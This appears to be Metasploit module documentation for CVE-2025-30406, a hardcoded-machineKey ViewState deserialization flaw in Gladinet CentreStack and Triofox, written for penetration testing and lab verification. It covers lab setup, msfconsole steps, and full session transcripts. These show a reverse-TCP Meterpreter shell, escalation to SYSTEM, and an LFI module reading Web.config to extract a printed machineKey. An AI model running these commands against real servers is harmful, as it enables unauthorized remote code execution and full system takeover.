## Vulnerable Application
A vulnerability in Gladinet CentreStack and Triofox application using hardcoded cryptographic keys for ViewState
could allow an attacker to forge ViewState data.
This can lead to unauthorized actions such as remote code execution.
Both applications make use of a hardcoded machineKey in the IIS web.config file, which is responsible for securing
ASP.NET ViewState data. If an attacker obtains the machineKey, they can forge ViewState payloads that pass integrity checks.
This can result in ViewState deserialization attacks, potentially leading to remote code execution (RCE) on the web server.

* Gladinet CentreStack versions up to 16.4.10315.56368 are vulnerable (fixed in 16.4.10315.56368).
* Gladinet Triofox versions up to 16.4.10317.56372 are vulnerable (fixed in 16.4.10317.56372)

The following releases were tested.

**Gladinet CentreStack and Triofox:**
* Gladinet CentreStack Build 16.1.10296.56315 on Windows Server 2019
* Gladinet Triofox Build 16.1.10296.56315 on Windows Server 2019

## Installation steps to install Gladinet CentreStack or Triofox Enterprise Editions
* Install your favorite virtualization engine (VMware or VirtualBox) on your preferred platform.
* Here are the installation instructions for [VirtualBox on MacOS](https://tecadmin.net/how-to-install-virtualbox-on-macos/).
* Download an evaluation Windows Server iso image (2016, 2019 or 2022) and install it as a VM on your virtualization engine.
* Note: Google is your best friend on how to do this ;-)
* Download the [Gladinet CentreStack gui installer](https://www.centrestack.com/p/gce_latest_release.html) or...
* Download the [Gladinet Triofox gui installer](https://access.triofox.com/releases_history/).
* Note: For Triofox, you will need a free trail account to reach the installer page.
* Run the gui installer on your Windows VM.
* Reboot your VM and you should be able to access the application via `https://your_ip/portal/loginpage.aspx`.

You are now ready to test the module.

## Verification Steps
- [ ] Start `msfconsole`
- [ ] `use exploit/windows/http/gladinet_viewstate_deserialization_cve_2025_30406`
- [ ] `set rhosts <ip-target>`
- [ ] `set rport <port>`
- [ ] `set lhost <attacker-ip>`
- [ ] `set target <0=Windows Command>`
- [ ] `exploit`
- [ ] you should get a `shell` or `Meterpreter` session depending on the `payload` and `target` settings

## Options

### MACHINEKEY

Machine key in hex format. Default: hardcoded vulnerable key. This option allows you to specify a custom machineKey
if you have extracted it from the Web.config file (e.g., using the auxiliary module `auxiliary/gather/gladinet_storage_lfi_cve_2025_11371`).

## Scenarios
### Gladinet CentreStack Build 16.1.10296.56315 on Windows Server 2019 - Windows Command target
```msf
msf6 > use exploit/windows/http/gladinet_viewstate_deserialization_cve_2025_30406
[*] No payload configured, defaulting to cmd/windows/http/x64/meterpreter/reverse_tcp
msf6 exploit(windows/http/gladinet_viewstate_deserialization_cve_2025_30406) > set rhosts 192.168.1.21
rhosts => 192.168.1.21
msf6 exploit(windows/http/gladinet_viewstate_deserialization_cve_2025_30406) > set rport 80
rport => 80
msf6 exploit(windows/http/gladinet_viewstate_deserialization_cve_2025_30406) > set ssl false
ssl => false
msf6 exploit(windows/http/gladinet_viewstate_deserialization_cve_2025_30406) > set lhost 192.168.1.44
lhost => 192.168.1.44
msf6 exploit(windows/http/gladinet_viewstate_deserialization_cve_2025_30406) > set fetch_srvport 9999
fetch_srvport => 9999
msf6 exploit(windows/http/gladinet_viewstate_deserialization_cve_2025_30406) > exploit
[*] Started reverse TCP handler on 192.168.1.44:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] The following auxiliary modules can extract the machineKey from Web.config:
[*]   - auxiliary/gather/gladinet_storage_lfi_cve_2025_11371
[*]   - auxiliary/gather/gladinet_storage_access_ticket_forge
[+] The target appears to be vulnerable. Service CentreStack (Build 16.1.10296.56315)
[*] Executing Windows Command for cmd/windows/http/x64/meterpreter/reverse_tcp
[*] Sending stage (230982 bytes) to 192.168.1.21
[*] Meterpreter session 1 opened (192.168.1.44:4444 -> 192.168.1.21:49789) at 2025-12-12 19:02:47 +0100

meterpreter > getuid
Server username: IIS APPPOOL\portal
meterpreter > sysinfo
Computer        : WIN-BJDNH44EEDB
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > pwd
c:\windows\system32\inetsrv
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```
### Using custom machineKey extracted from Web.config

If you have extracted the machineKey using the auxiliary module, you can specify it with the MACHINEKEY option:

```msf
msf6 > use auxiliary/gather/gladinet_storage_lfi_cve_2025_11371
msf6 auxiliary(gather/gladinet_storage_lfi_cve_2025_11371) > set rhosts 192.168.1.21
rhosts => 192.168.1.21
msf6 auxiliary(gather/gladinet_storage_lfi_cve_2025_11371) > run
[*] Running module against 192.168.1.21
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. LFI vulnerability confirmed
[*] Attempting to read file via LFI: Program Files (x86)\Gladinet Cloud Enterprise\root\Web.config
[+] Successfully read file: Program Files (x86)\Gladinet Cloud Enterprise\root\Web.config
[+] Extracted machineKey from Web.config
MachineKey: 5496832242CC3228E292EEFFCDA089149D789E0C4D7C1A5D02BC542F7C6279BE9DD770C9EDD5D67C66B7E621411D3E57EA181BBF89FD21957DCDDFACFD926E16
[+] For RCE: use exploit/windows/http/gladinet_viewstate_deserialization_cve_2025_30406
[*] Set the MACHINEKEY option in the exploit module:
use exploit/windows/http/gladinet_viewstate_deserialization_cve_2025_30406
set MACHINEKEY 5496832242CC3228E292EEFFCDA089149D789E0C4D7C1A5D02BC542F7C6279BE9DD770C9EDD5D67C66B7E621411D3E57EA181BBF89FD21957DCDDFACFD926E16
[*] Auxiliary module execution completed

msf6 auxiliary(gather/gladinet_storage_lfi_cve_2025_11371) > use exploit/windows/http/gladinet_viewstate_deserialization_cve_2025_30406
[*] No payload configured, defaulting to cmd/windows/http/x64/meterpreter/reverse_tcp
msf6 exploit(windows/http/gladinet_viewstate_deserialization_cve_2025_30406) > set rhosts 192.168.1.21
rhosts => 192.168.1.21
msf6 exploit(windows/http/gladinet_viewstate_deserialization_cve_2025_30406) > set rport 80
rport => 80
msf6 exploit(windows/http/gladinet_viewstate_deserialization_cve_2025_30406) > set ssl false
ssl => false
msf6 exploit(windows/http/gladinet_viewstate_deserialization_cve_2025_30406) > set lhost 192.168.1.44
lhost => 192.168.1.44
msf6 exploit(windows/http/gladinet_viewstate_deserialization_cve_2025_30406) > set fetch_srvport 9999
fetch_srvport => 9999
msf6 exploit(windows/http/gladinet_viewstate_deserialization_cve_2025_30406) > set machinekey 5496832242CC3228E292EEFFCDA089149D789E0C4D7C1A5D02BC542F7C6279BE9DD770C9EDD5D67C66B7E621411D3E57EA181BBF89FD21957DCDDFACFD926E16
machinekey => 5496832242CC3228E292EEFFCDA089149D789E0C4D7C1A5D02BC542F7C6279BE9DD770C9EDD5D67C66B7E621411D3E57EA181BBF89FD21957DCDDFACFD926E16
msf6 exploit(windows/http/gladinet_viewstate_deserialization_cve_2025_30406) > exploit
[*] Started reverse TCP handler on 192.168.1.44:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] The following auxiliary modules can extract the machineKey from Web.config:
[*]   - auxiliary/gather/gladinet_storage_lfi_cve_2025_11371
[*]   - auxiliary/gather/gladinet_storage_access_ticket_forge
[+] The target appears to be vulnerable. Service CentreStack (Build 16.1.10296.56315)
[*] Executing Windows Command for cmd/windows/http/x64/meterpreter/reverse_tcp
[*] Sending stage (230982 bytes) to 192.168.1.21
[*] Meterpreter session 1 opened (192.168.1.44:4444 -> 192.168.1.21:49789) at 2025-12-12 19:02:47 +0100

meterpreter > getuid
Server username: IIS APPPOOL\portal
meterpreter > sysinfo
Computer        : WIN-BJDNH44EEDB
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > pwd
c:\windows\system32\inetsrv
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```
## Limitations
No limitations identified.
